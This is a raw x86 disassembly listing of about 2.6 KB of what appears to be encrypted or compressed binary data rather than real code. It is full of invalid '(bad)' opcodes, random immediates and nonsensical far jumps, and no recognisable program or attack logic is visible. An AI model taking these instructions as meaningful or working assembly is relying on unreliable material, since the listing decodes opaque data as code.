  42776f:	ds jnp 0x4277af
  427772:	sub    ch,0xea
  427775:	ret    0x39cc
  427778:	dec    ebp
  427779:	cmp    eax,DWORD PTR [ecx+ecx*1+0x9e86ccd]
  427780:	sub    BYTE PTR [esi+0x6b],cl
  427783:	cdq    
  427784:	nop
  427785:	push   edx
  427786:	sbb    al,0x65
  427788:	xchg   esp,eax
  427789:	push   edi
  42778a:	popa   
  42778b:	sub    ah,BYTE PTR [edi+0x34fbc882]
  427791:	mov    fs,WORD PTR [edx-0x3e2417d5]
  427797:	sub    DWORD PTR [edx+0x7f],0x38ce4167
  42779e:	shl    BYTE PTR [edi],0xb
  4277a1:	mov    cl,0xff
  4277a3:	ret    
  4277a4:	push   edx
  4277a5:	(bad)  
  4277a6:	loop   0x427765
  4277a8:	inc    esp
  4277a9:	xor    BYTE PTR [ebx-0x6f],0xe3
  4277ad:	ror    DWORD PTR [edi-0x35],0x98
  4277b1:	pop    ecx
  4277b2:	xor    DWORD PTR [esi+ecx*8],eax
  4277b5:	adc    ebx,ecx
  4277b7:	neg    DWORD PTR [eax+eiz*1+0x7d0d7d2d]
  4277be:	(bad)  [esi]
  4277c0:	dec    eax
  4277c1:	(bad)
  4277c5:	sub    ch,BYTE PTR [eax+0x6c]
  4277c8:	push   0xcdbc4ccc
  4277cd:	push   edi
  4277ce:	push   cs
  4277cf:	dec    ecx
  4277d0:	scas   al,BYTE PTR es:[edi]
  4277d1:	(bad)  
  4277d2:	or     ecx,DWORD PTR [ebx-0x30eeaa84]
  4277d8:	dec    ebx
  4277d9:	lds    esi,FWORD PTR [edi+eax*1]
  4277dc:	push   ebx
  4277dd:	cmc    
  4277de:	mov    BYTE PTR [edx],dl
  4277e0:	lahf   
  4277e1:	and    esi,DWORD PTR [eax]
  4277e3:	fild   DWORD PTR [edx]
  4277e5:	fisttp DWORD PTR [ecx+0x4c76cd5d]
  4277eb:	cmp    eax,0x4b696719
  4277f0:	cmc    
  4277f1:	mov    esi,0x586debe9
  4277f6:	pop    edx
  4277f7:	retf   
  4277f8:	das    
  4277f9:	in     al,dx
  4277fa:	dec    ebp
  4277fb:	mov    dl,0x34
  4277fd:	add    edi,DWORD PTR [edx-0x26]
  427800:	sbb    BYTE PTR [ebx],ch
  427802:	and    eax,0x383806b5
  427807:	push   0xfefad028
  42780c:	pop    ds
  42780d:	push   ds
  42780e:	sar    ah,1
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	inc    edi
  427881:	add    al,0x50
  427883:	test   DWORD PTR [eax],esp
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    al,0x1
  42788a:	add    BYTE PTR [eax],al
  42788c:	outs   dx,DWORD PTR ds:[esi]
  42788d:	inc    ebp
  42788e:	adc    DWORD PTR [esi+eiz*2+0x4e0e3baa],0xc
  427896:	(bad)  
  427897:	jmp    0x42790a
  427899:	cdq    
  42789a:	dec    DWORD PTR ds:0x1170a2ba
  4278a0:	or     eax,0x65d668de
  4278a5:	outs   dx,DWORD PTR ds:[esi]
  4278a6:	ins    DWORD PTR es:[edi],dx
  4278a7:	mov    esi,0x1c7f59de
  4278ac:	inc    esi
  4278ad:	out    dx,al
  4278ae:	jbe    0x427893
  4278b0:	pop    ss
  4278b1:	mov    ch,0x88
  4278b3:	push   ecx
  4278b4:	in     eax,dx
  4278b5:	cmp    ebx,DWORD PTR [edx-0x80]
  4278b8:	sub    eax,0xad5b8a2a
  4278bd:	dec    edx
  4278be:	mov    ah,0x90
  4278c0:	fdiv   st,st(7)
  4278c2:	and    eax,DWORD PTR [eax+0x2a3a728a]
  4278c8:	mov    bh,0xb4
  4278ca:	rol    BYTE PTR [edi-0x11],0x5d
  4278ce:	add    al,0x8e
  4278d0:	sub    eax,0xa3247730
  4278d5:	dec    esi
  4278d6:	adc    esp,edx
  4278d8:	inc    edx
  4278d9:	dec    edx
  4278da:	retf   0x5bcb
  4278dd:	std    
  4278de:	cmp    eax,0x13687ab1
  4278e3:	ret    0xd148
  4278e6:	test   BYTE PTR [ebp+edi*8+0x6747b577],ah
  4278ed:	stos   DWORD PTR es:[edi],eax
  4278ee:	ds sbb eax,0xe9aa71c2
  4278f4:	sub    esi,edi
  4278f6:	(bad)  
  4278f7:	mov    al,0x75
  4278f9:	fs add esi,edx
  4278fc:	mov    bl,0xc1
  4278fe:	inc    ebx
  4278ff:	push   esp
  427900:	retf   
  427901:	and    edi,DWORD PTR [ebx+0x6e]
  427904:	repnz clc 
  427906:	inc    esp
  427907:	hlt    
  427908:	(bad)  [edi+0x2be5cd8a]
  42790e:	outs   dx,BYTE PTR ds:[esi]
  42790f:	stos   DWORD PTR es:[edi],eax
  427910:	jl     0x427913
  427912:	fcom   DWORD PTR [ecx-0x4]
  427915:	cmp    ebp,edi
  427917:	jmp    0xc56a:0x567deac0
  42791e:	addr16 jns 0x42790a
  427921:	xor    esi,DWORD PTR [ebx+0xb]
  427924:	cld    
  427925:	neg    BYTE PTR [eax]
  427927:	sub    edi,esi
  427929:	jne    0x427987
  42792b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42792c:	and    BYTE PTR [edx+0x47],bh
  42792f:	inc    edi
  427930:	push   0x70
  427932:	into   
  427933:	and    DWORD PTR ds:0xedf5f534,ecx
  427939:	ror    DWORD PTR [edi],0x8a
  42793c:	ins    BYTE PTR es:[edi],dx
  42793d:	dec    eax
  42793e:	xchg   ecx,eax
  42793f:	loope  0x4278e2
  427941:	inc    ebp
  427942:	jns    0x427978
  427944:	push   cs
  427945:	nop
  427946:	dec    esi
  427947:	sti    
  427948:	xor    BYTE PTR [ecx],ch
  42794a:	fisub  WORD PTR [ebp+0x18b96572]
  427950:	xchg   DWORD PTR [ebx-0x6],esp
  427953:	(bad)  
  427954:	sbb    ebp,DWORD PTR [ecx+0x63]
  427957:	lahf   
  427958:	pushf  
  427959:	and    al,0xb3
  42795b:	inc    edi
  42795c:	lods   eax,DWORD PTR ds:[esi]
  42795d:	dec    eax
  42795e:	mov    esi,0x7ab1a79
  427963:	inc    edi
  427964:	repnz in al,dx
  427966:	test   bh,dh
  427968:	pop    esi
  427969:	sbb    DWORD PTR [ebx+edi*2+0x47],edi
  42796d:	pop    ebp
  42796e:	jp     0x427967
  427970:	int3   
  427971:	mov    esi,0x8f4ee868
  427976:	sti    
  427977:	and    ebx,ebx
  427979:	mov    ch,0xf1
  42797b:	mov    al,0x39
  42797d:	sub    eax,0x46534e3
  427982:	inc    esp
  427983:	retf   0x866a
  427986:	dec    bx
  427988:	jp     0x427997
  42798a:	ja     0x427943
  42798c:	xor    al,BYTE PTR [ebx]
  42798e:	dec    eax
  42798f:	test   BYTE PTR [eax],al
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x68d0753a]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	xor    BYTE PTR [edi],bl
  427a0e:	fisubr DWORD PTR [esi-0x36]
  427a11:	inc    esi
  427a12:	cdq    
  427a13:	popf   
  427a14:	add    DWORD PTR [edx-0x5a],ecx
  427a17:	xor    al,0x8b
  427a19:	xor    DWORD PTR [edx],esi
  427a1b:	jne    0x427a84
  427a1d:	xor    eax,0x28201851
  427a22:	xor    al,0x7b
  427a24:	lds    esp,FWORD PTR [edx]
  427a26:	shr    bl,1
  427a28:	sub    BYTE PTR [edx],0x1
  427a2b:	int3   
  427a2c:	inc    edi
  427a2d:	mov    al,ds:0x3643ab94
  427a32:	or     al,0x9a
  427a34:	out    0x7e,eax
  427a36:	mov    dl,0x31
  427a38:	adc    DWORD PTR [ecx+0x67],edi
  427a3b:	aas    
  427a3c:	pop    edx
  427a3d:	inc    eax
  427a3e:	sbb    BYTE PTR [ecx-0x4755dcad],0x72
  427a45:	outs   dx,BYTE PTR ds:[esi]
  427a46:	out    dx,al
  427a47:	jmp    0x427aa4
  427a49:	mov    dh,BYTE PTR [edx]
  427a4b:	adc    esi,esp
  427a4d:	adc    eax,0x493acedd
  427a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a53:	push   ss
  427a54:	dec    ecx
  427a55:	inc    ecx
  427a56:	push   cs
  427a57:	add    DWORD PTR [edi-0x316a2bfe],ebx
  427a5d:	mov    al,ds:0xe47eb2de
  427a62:	dec    ebp
  427a63:	mov    eax,0xd259d74b
  427a68:	xchg   ebx,eax
  427a69:	inc    ebp
  427a6a:	mov    dh,0xe0
  427a6c:	or     eax,DWORD PTR [eax]
  427a6e:	popf   
  427a6f:	xadd   BYTE PTR [edx],dl
  427a72:	dec    ecx
  427a73:	fisub  WORD PTR [ecx-0x53]
  427a76:	pop    ecx
  427a77:	mov    al,ds:0x156736bd
  427a7c:	sub    BYTE PTR [eax-0x2c],0xeb
  427a80:	test   al,0xdc
  427a82:	(bad)  
  427a83:	fsub   st,st(5)
  427a85:	icebp  
  427a86:	packssdw mm4,QWORD PTR [eax-0x1ffe057]
  427a8d:	push   ebp
  427a8e:	xor    al,0xb1
  427a90:	ret    0x39be
  427a93:	(bad)  
  427a94:	push   edx
  427a95:	mov    esp,0xb3048f16
  427a9a:	adc    DWORD PTR [edx+0x2f70bf2e],ecx
  427aa0:	outs   dx,BYTE PTR ds:[esi]
  427aa1:	std    
  427aa2:	popf   
  427aa3:	(bad)  
  427aa4:	sbb    bl,BYTE PTR [edx]
  427aa6:	aad    0x41
  427aa8:	ret    
  427aa9:	mov    DWORD PTR [eax+0x542d5359],0x81c5bae
  427ab3:	sub    bh,BYTE PTR [edx]
  427ab5:	and    eax,0xc1a93578
  427aba:	(bad)  
  427abb:	stc    
  427abc:	outs   dx,DWORD PTR ds:[esi]
  427abd:	dec    edi
  427abe:	data16 or BYTE PTR [ecx+ebx*2],ah
  427ac2:	or     edi,edi
  427ac4:	or     BYTE PTR [esi],dl
  427ac6:	out    dx,eax
  427ac7:	jb     0x427af8
  427ac9:	enter  0x58e2,0x7c
  427acd:	imul   esp,DWORD PTR [edi+0x2c],0xffffffae
  427ad1:	xor    BYTE PTR [ecx+0x7d],dl
  427ad4:	cmp    eax,0x7905e736
  427ad9:	pushf  
  427ada:	sub    eax,edi
  427adc:	mov    dh,0xf1
  427ade:	mov    cl,0x95
  427ae0:	ret    
  427ae1:	mov    WORD PTR [ebp+edx*2-0x77d03f8c],ds
  427ae8:	push   ds
  427ae9:	lods   eax,DWORD PTR ds:[esi]
  427aea:	pop    ebx
  427aeb:	int3   
  427aec:	mov    ds:0x7043716c,eax
  427af1:	mov    ebx,0xd0f7ba02
  427af6:	pushf  
  427af7:	push   cs
  427af8:	test   al,0x2a
  427afa:	mov    ebx,0x60c2e3d
  427aff:	add    eax,DWORD PTR [esi+0x70e933ab]
  427b05:	hlt    
  427b06:	sbb    ebp,edi
  427b08:	clc    
  427b09:	fist   DWORD PTR gs:0x34613a25
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    al
  427b81:	and    dl,dh
  427b83:	shr    BYTE PTR [eax],cl
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	inc    esi
  427b8d:	fcomp  DWORD PTR [esi+0x5d7c2e2d]
  427b93:	mov    DWORD PTR [edx-0x6c0c61b2],edx
  427b99:	inc    eax
  427b9a:	push   esp
  427b9b:	fmul   st(6),st
  427b9d:	add    edi,DWORD PTR [ebx-0x31]
  427ba0:	mov    bl,0x19
  427ba2:	add    ebx,DWORD PTR [edi+0x61f1b6f1]
  427ba8:	frstor [eax-0x2c09fea4]
  427bae:	jecxz  0x427b94
  427bb0:	stos   DWORD PTR es:[edi],eax
  427bb1:	sbb    BYTE PTR [eax-0x7d],ch
  427bb4:	inc    edi
  427bb5:	jbe    0x427bde
  427bb7:	and    cl,BYTE PTR [eax+0x94da46b]
  427bbd:	(bad)  
  427bbf:	jge    0x427c01
  427bc1:	mov    esi,0x2d5d9d22
  427bc6:	clc    
  427bc7:	sbb    eax,0x3e199a2a
  427bcc:	sub    eax,0xc03d7bb
  427bd1:	data16 add ch,al
  427bd4:	out    dx,al
  427bd5:	ja     0x427c09
  427bd7:	cwde   
  427bd8:	rol    bl,1
  427bda:	sbb    ebx,DWORD PTR [edi+0x55]
  427bdd:	retf   0xfa30
  427be0:	lea    edx,[edi-0x62c8e99f]
  427be6:	popf   
  427be7:	daa    
  427be8:	test   BYTE PTR [edx],ah
  427bea:	and    al,0x90
  427bec:	arpl   WORD PTR [esi-0x77],dx
  427bef:	mov    WORD PTR [ebx],fs
  427bf1:	push   ebx
  427bf2:	push   ecx
  427bf3:	push   ebx
  427bf4:	mov    edx,0xe8690d11
  427bf9:	adc    edi,DWORD PTR [edi]
  427bfb:	inc    ecx
  427bfc:	push   ss
  427bfd:	adc    BYTE PTR [edx+0x1cc48efa],0x3
  427c04:	inc    edx
  427c05:	push   ds
  427c06:	mov    ebx,0x3757102b
  427c0b:	mov    ebx,0xc1ca37d7
  427c10:	and    DWORD PTR [ebx],esp
  427c12:	add    eax,0x31627535
  427c17:	pop    esi
  427c18:	dec    BYTE PTR [esi-0x457386ae]
  427c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c1f:	mov    esp,0x79c2b0cb
  427c24:	and    eax,0xaae9326d
  427c29:	leave  
  427c2a:	or     al,0x99
  427c2c:	outs   dx,DWORD PTR ds:[esi]
  427c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c2e:	jne    0x427bc3
  427c30:	imul   edx,DWORD PTR [eax],0xf215148c
  427c36:	mov    dh,0x60
  427c38:	push   ebp
  427c39:	jecxz  0x427c3f
  427c3b:	es sub eax,0x427fa33
  427c41:	retf   
  427c42:	mov    eax,ebp
  427c44:	and    ebx,esp
  427c46:	mov    ds:0x476bcaa0,eax
  427c4b:	dec    edx
  427c4c:	xchg   esp,eax
  427c4d:	(bad)  
  427c4e:	fisubr DWORD PTR [ebx+0x7c]
  427c51:	or     DWORD PTR [esi],esp
  427c53:	dec    ebx
  427c54:	mov    ds:0x19859307,eax
  427c59:	push   ss
  427c5a:	(bad)  
  427c5b:	icebp  
  427c5c:	dec    edi
  427c5d:	inc    eax
  427c5e:	mov    ds:0xd6f5a4c7,eax
  427c63:	arpl   WORD PTR [eax-0x6f589df],di
  427c69:	mov    ebp,0x97ca02f6
  427c6e:	push   0x68dc3d1d
  427c73:	xchg   edi,eax
  427c74:	inc    ah
  427c76:	scas   al,BYTE PTR es:[edi]
  427c77:	out    dx,eax
  427c78:	mov    eax,ds:0xbe195277
  427c7d:	jne    0x427c54
  427c7f:	xor    al,0x86
  427c81:	and    ah,BYTE PTR [esi+0x735eebc3]
  427c87:	(bad)  
  427c88:	fisubr DWORD PTR [eax+eax*2-0x3f]
  427c8c:	out    dx,al
  427c8d:	push   eax
  427c8e:	imul   esi,DWORD PTR [edi],0x0
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x7c3b5d44,ebx
  427d02:	aad    0x34
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	test   al,al
  427d0e:	and    al,0xe1
  427d10:	push   esi
  427d11:	sub    ebp,ebp
  427d13:	das    
  427d14:	cmp    ch,0xe1
  427d17:	cmp    cl,BYTE PTR [ebx+edi*1-0x5a]
  427d1b:	or     edx,DWORD PTR [eax]
  427d1d:	std    
  427d1e:	mov    WORD PTR [edi],cs
  427d20:	mov    eax,0x231a3484
  427d25:	sbb    DWORD PTR [edi-0x2ba8ad1c],ebx
  427d2b:	and    BYTE PTR [edi+0x7d],ah
  427d2e:	call   0xb11ab30c
  427d33:	fisttp QWORD PTR [edi+0x4a]
  427d36:	ret    0x910
  427d39:	mov    esp,0xa680fdb4
  427d3e:	mov    dh,0x49
  427d40:	sbb    bl,BYTE PTR [eax]
  427d42:	ret    
  427d43:	add    al,0xf6
  427d45:	dec    esp
  427d46:	mov    ah,0x69
  427d48:	imul   BYTE PTR [edx-0x61]
  427d4b:	js     0x427ccf
  427d4d:	jecxz  0x427d0e
  427d4f:	or     eax,0xe1358347
  427d54:	lods   eax,DWORD PTR ds:[esi]
  427d55:	sbb    dh,dl
  427d57:	cmp    DWORD PTR ds:[edx-0x7b62bd31],esp
  427d5e:	in     al,0xd4
  427d60:	cld    
  427d61:	jnp    0x427dbc
  427d63:	das    
  427d64:	push   es
  427d65:	scas   al,BYTE PTR es:[edi]
  427d66:	mov    esp,ebp
  427d68:	in     eax,dx
  427d69:	(bad)  [ebx+0x7a]
  427d6c:	dec    eax
  427d6d:	or     ecx,DWORD PTR [edi]
  427d6f:	lahf   
  427d70:	rcr    DWORD PTR [ebx],0x62
  427d73:	test   eax,0xe0eef2f1
  427d78:	(bad)  [eax+0x4b]
  427d7b:	cdq    
  427d7c:	cdq    
  427d7d:	add    BYTE PTR [eax+0xc],cl
  427d80:	arpl   WORD PTR [eax-0x30e62906],sp
  427d86:	and    DWORD PTR [eax-0x767ff593],edi
  427d8c:	mov    esp,0xfa651630
  427d91:	stos   DWORD PTR es:[edi],eax
  427d92:	test   esi,ecx
  427d94:	xor    DWORD PTR [ebx],ecx
  427d96:	sar    esi,0xed
  427d99:	stos   DWORD PTR es:[edi],eax
  427d9a:	je     0x427de8
  427d9c:	cdq    
  427d9d:	pop    es
  427d9e:	xor    BYTE PTR [eax+ebp*4+0xe38f927],dh
  427da5:	dec    esp
  427da6:	rcr    bl,cl
  427da8:	push   ecx
  427da9:	sub    eax,0x7ecf8595
  427dae:	ins    DWORD PTR es:[edi],dx
  427daf:	dec    ebp
  427db0:	push   cs
  427db1:	pushf  
  427db2:	xchg   edx,eax
  427db3:	and    DWORD PTR [edi+0x6295540],0xc0b9492b
  427dbd:	ja     0x427daf
  427dbf:	jns    0x427ddd
  427dc1:	retf   
  427dc2:	adc    eax,0xbe2b0bdd
  427dc7:	icebp  
  427dc8:	div    DWORD PTR [edi]
  427dca:	in     eax,0xac
  427dcc:	pop    esi
  427dcd:	xor    esi,DWORD PTR [esi-0x7e6beaaa]
  427dd3:	xor    ebx,DWORD PTR [edx]
  427dd5:	push   edi
  427dd6:	sub    eax,0x26ba0fb2
  427ddb:	(bad)  
  427ddc:	mov    edi,0x5df7dfab
  427de1:	(bad)  
  427de2:	in     al,dx
  427de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427de4:	data16 aad 0xbe
  427de7:	aas    
  427de8:	pop    bp
  427dea:	push   0x73
  427dec:	mov    BYTE PTR [ebp+0x5d],al
  427def:	fmul   DWORD PTR [esi+0x57]
  427df2:	pushf  
  427df3:	inc    esi
  427df4:	mov    gs,WORD PTR [ecx]
  427df6:	mov    ah,0xc9
  427df8:	lock ret 0x4649
  427dfc:	push   eax
  427dfd:	ins    DWORD PTR es:[edi],dx
  427dfe:	inc    ebp
  427dff:	loop   0x427d9f
  427e01:	mov    cl,0x7a
  427e03:	sbb    DWORD PTR [ebx],edi
  427e05:	cvtps2pi mm5,QWORD PTR [edx+eiz*4+0x1]
  427e0a:	lds    esp,FWORD PTR [edi]
  427e0c:	cld    
  427e0d:	or     esp,DWORD PTR [ebx+ebx*2+0x0]
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	in     al,0xb2
  427e82:	iret   
  427e83:	outs   dx,BYTE PTR ds:[esi]
  427e84:	xor    BYTE PTR [edx+0x1040001],ch
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	(bad)  
  427e8d:	or     esi,DWORD PTR [esp+edi*8+0x6e]
  427e91:	pop    eax
  427e92:	inc    ebp
  427e93:	dec    edx
  427e94:	mov    dh,BYTE PTR [ecx-0x68]
  427e97:	scas   eax,DWORD PTR es:[edi]
  427e98:	mov    al,0x34
  427e9a:	push   edi
  427e9b:	int3   
  427e9c:	mov    cl,bl
  427e9e:	add    BYTE PTR [ecx+0x2ebd1010],dh
  427ea4:	je     0x427e52
  427ea6:	and    al,0xb0
  427ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ea9:	out    dx,eax
  427eaa:	sti    
  427eab:	fs jne 0x427ec9
  427eae:	aaa    
  427eaf:	add    al,0x54
  427eb1:	cmp    al,0x40
  427eb3:	mov    bh,0xc
  427eb5:	xor    al,0x8d
  427eb7:	dec    eax
  427eb8:	cli    
  427eb9:	aad    0x4b
  427ebb:	sar    BYTE PTR [eax-0x27],0xb0
  427ebf:	cs cwde 
  427ec1:	in     al,0x74
  427ec3:	dec    eax
  427ec4:	or     DWORD PTR [ebp-0x51f342d5],0xf87a511c
  427ece:	sbb    eax,esp
  427ed0:	or     eax,0x9c898446
  427ed5:	or     DWORD PTR [edi+edx*4+0x39],ecx
  427ed9:	jb     0x427eda
  427edb:	xor    BYTE PTR [esi-0x10107039],bl
  427ee1:	mov    al,ds:0x7db89646
  427ee6:	retf   
  427ee7:	stos   BYTE PTR es:[edi],al
  427ee8:	push   cs
  427ee9:	sahf   
  427eea:	test   DWORD PTR ds:0x8c2b189b,edi
  427ef0:	cmp    edx,esi
  427ef2:	stos   DWORD PTR es:[edi],eax
  427ef3:	push   edx
  427ef4:	call   0xa699:0xd7d1f021
  427efb:	jbe    0x427ec7
  427efd:	adc    al,ah
  427eff:	jae    0x427e8c
  427f01:	xor    DWORD PTR [ebx-0x63cdd8ff],0x2db526be
  427f0b:	dec    ebp
  427f0c:	(bad)  
  427f0d:	pop    edx
  427f0e:	cli    
  427f0f:	enter  0x9488,0x68
  427f13:	dec    edx
  427f14:	push   ebp
  427f15:	pop    edx
  427f16:	fisubr DWORD PTR [esi]
  427f18:	cmc    
  427f19:	jle    0x427f65
  427f1b:	dec    esp
  427f1c:	cmp    edi,DWORD PTR [esp+ebx*1+0x4c125fd9]
  427f23:	cmp    BYTE PTR [esi-0x5],ch
  427f26:	hlt    
  427f27:	mov    edx,0xd38cc100
  427f2c:	adc    al,bh
  427f2e:	add    ecx,ebx
  427f30:	adc    eax,0x691bb549
  427f35:	outs   dx,DWORD PTR ds:[esi]
  427f36:	jbe    0x427f3a
  427f38:	jp     0x427f8d
  427f3a:	das    
  427f3b:	gs jo  0x427ed2
  427f3e:	or     ebx,ebx
  427f40:	adc    eax,0xc5d0db11
  427f45:	jb     0x427f7d
  427f47:	adc    DWORD PTR [edx+ebp*4-0x8],esp
  427f4b:	mul    DWORD PTR [eax]
  427f4d:	add    eax,0x52caccdd
  427f52:	imul   ebx,DWORD PTR [edx+0x1c12caa0],0xffffffb4
  427f59:	(bad)  
  427f5a:	adc    esi,DWORD PTR [edi+0x0]
  427f5d:	or     BYTE PTR [ebx+ecx*2-0x6c],bl
  427f61:	mov    esi,0xf3717233
  427f66:	leave  
  427f67:	inc    ebp
  427f68:	push   eax
  427f69:	lea    ebx,[ebx+0x3130b5f4]
  427f6f:	imul   eax,DWORD PTR [ecx+eax*4-0x5e3550d0],0xf275936a
  427f7a:	mov    esi,0xa0f427f9
  427f7f:	rol    ecx,0xcc
  427f82:	adc    DWORD PTR [esi+0x7a],0x49
  427f86:	jg     0x427fd6
  427f88:	ror    BYTE PTR [edi-0x6578e625],1
  427f8e:	(bad)  
  427f8f:	icebp  
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	push   ds
  428001:	cmp    DWORD PTR [ecx+edx*1+0x34],eax
  428005:	stos   DWORD PTR es:[edi],eax
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	pop    ds
  42800d:	leave  
  42800e:	dec    esi
  42800f:	dec    ebx
  428010:	push   edx
  428011:	add    edx,ebp
  428013:	aas    
  428014:	xor    DWORD PTR [eax],0xd
  428017:	sub    ch,BYTE PTR [edi-0x71620688]
  42801d:	fs fwait
  42801f:	aas    
  428020:	sbb    al,0x73
  428022:	or     DWORD PTR [edx-0x56],edx
  428025:	cmp    eax,0xb3d4a343
  42802a:	cdq    
  42802b:	xor    DWORD PTR [ecx-0x7f3c30d7],esi
  428031:	shl    DWORD PTR [edx-0x44aed97f],1
  428037:	popa   
  428038:	ret    
  428039:	or     DWORD PTR [ebx+ebx*1+0x7f],ecx
  42803d:	in     al,dx
  42803e:	enter  0xa951,0x40
  428042:	pop    edx
  428043:	mov    edi,0x19479fa8
  428048:	(bad)  
  428049:	or     eax,0x576d61be
  42804e:	pushf  
  42804f:	cmp    ebp,DWORD PTR [eax+0x19]
  428052:	and    dl,al
  428054:	stos   BYTE PTR es:[edi],al
  428055:	and    esi,edx
  428057:	push   edx
  428058:	lds    esp,FWORD PTR [edi]
  42805a:	inc    BYTE PTR [ecx-0x30]
  42805d:	inc    esp
  42805e:	mov    dh,0x3d
  428060:	mov    edi,0xe0631763
  428065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428066:	inc    ebp
  428067:	std    
  428068:	cmc    
  428069:	(bad)  
  42806a:	cmp    eax,0x576f7ade
  42806f:	arpl   WORD PTR [ecx+ebp*2-0x53ee8093],si
  428076:	sbb    eax,0xc636437b
  42807b:	test   eax,0x1fe20137
  428080:	mov    ebx,0xafb2950
  428085:	hlt    
  428086:	xor    al,0x73
  428088:	or     eax,0x2f71cbdc
  42808d:	inc    edx
  42808f:	ds in  al,dx
  428091:	in     al,0xb3
  428093:	sub    al,0xa8
  428095:	sbb    ch,0xea
  428098:	add    esi,DWORD PTR [edi+0x3c03ff6e]
  42809e:	rcl    BYTE PTR [eax-0x584e8a41],0x3c
  4280a5:	sub    dl,BYTE PTR [eax-0x41]
  4280a8:	mov    dh,0x1
  4280aa:	jno    0x4280b9
  4280ac:	aam    0x3e
  4280ae:	mov    edi,0x3d91ee83
  4280b3:	xor    esi,esi
  4280b5:	sahf   
  4280b6:	fadd   st,st(6)
  4280b8:	jmp    0x7d24:0xb821cb61
  4280bf:	and    eax,0xd098da06
  4280c4:	cmp    ebp,esp
  4280c6:	hlt    
  4280c7:	add    ah,BYTE PTR [edi+0x1e52abc2]
  4280cd:	pop    es
  4280ce:	ins    DWORD PTR es:[edi],dx
  4280cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280d0:	sbb    ah,BYTE PTR [eax+0x193655dc]
  4280d6:	(bad)  
  4280d7:	daa    
  4280d8:	xor    BYTE PTR [ebx-0x4c],ch
  4280db:	les    esi,FWORD PTR [eax+0x48]
  4280de:	inc    edi
  4280df:	stos   DWORD PTR es:[edi],eax
  4280e0:	sbb    DWORD PTR [esi+0x23],ebp
  4280e3:	into   
  4280e4:	mov    cl,0x42
  4280e6:	test   BYTE PTR [eax+edx*4-0x1f],0xaa
  4280eb:	or     cl,dh
  4280ed:	push   ebx
  4280ee:	gs sahf 
  4280f0:	sbb    al,0xe1
  4280f2:	(bad)  
  4280f3:	in     eax,dx
  4280f4:	mov    eax,ds:0xddc43eda
  4280f9:	je     0x428114
  4280fb:	push   ss
  4280fc:	cmp    al,BYTE PTR [eax-0x24]
  4280ff:	xchg   edx,eax
  428100:	jne    0x4280e5
  428102:	or     dh,al
  428104:	dec    esi
  428105:	cwde   
  428106:	pusha  
  428107:	pusha  
  428108:	sub    eax,0x9388d0e5
  42810d:	gs rcr dl,0x0
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	stos   BYTE PTR es:[edi],al
  428181:	push   0xac38389e
  428186:	add    DWORD PTR [eax],eax
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	push   ebx
  42818d:	sub    bl,dh
  42818f:	mov    ebp,0x77f29cbd
  428194:	fstp   TBYTE PTR [esi]
  428196:	jne    0x428120
  428198:	add    BYTE PTR [edi+0x33],0x4
  42819c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42819d:	adc    al,0xa7
  42819f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281a0:	and    eax,0x765f1f34
  4281a5:	and    ebx,DWORD PTR [esi+0x6aa8aac0]
  4281ab:	das    
  4281ac:	sti    
  4281ad:	retf   0x6ec4
  4281b0:	push   cs
  4281b1:	sbb    esi,DWORD PTR [ecx-0x6337a44e]
  4281b7:	idiv   BYTE PTR [ebp+0x40]
  4281ba:	in     eax,dx
  4281bb:	inc    esi
  4281bc:	or     DWORD PTR [edx-0x3960c1b5],ecx
  4281c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281c3:	fsubr  DWORD PTR [edx-0x7534ba49]
  4281c9:	push   ebp
  4281ca:	mov    esp,0xdcba0c5
  4281cf:	out    dx,eax
  4281d0:	inc    ebx
  4281d1:	scas   al,BYTE PTR es:[edi]
  4281d2:	adc    DWORD PTR [edi],0x54
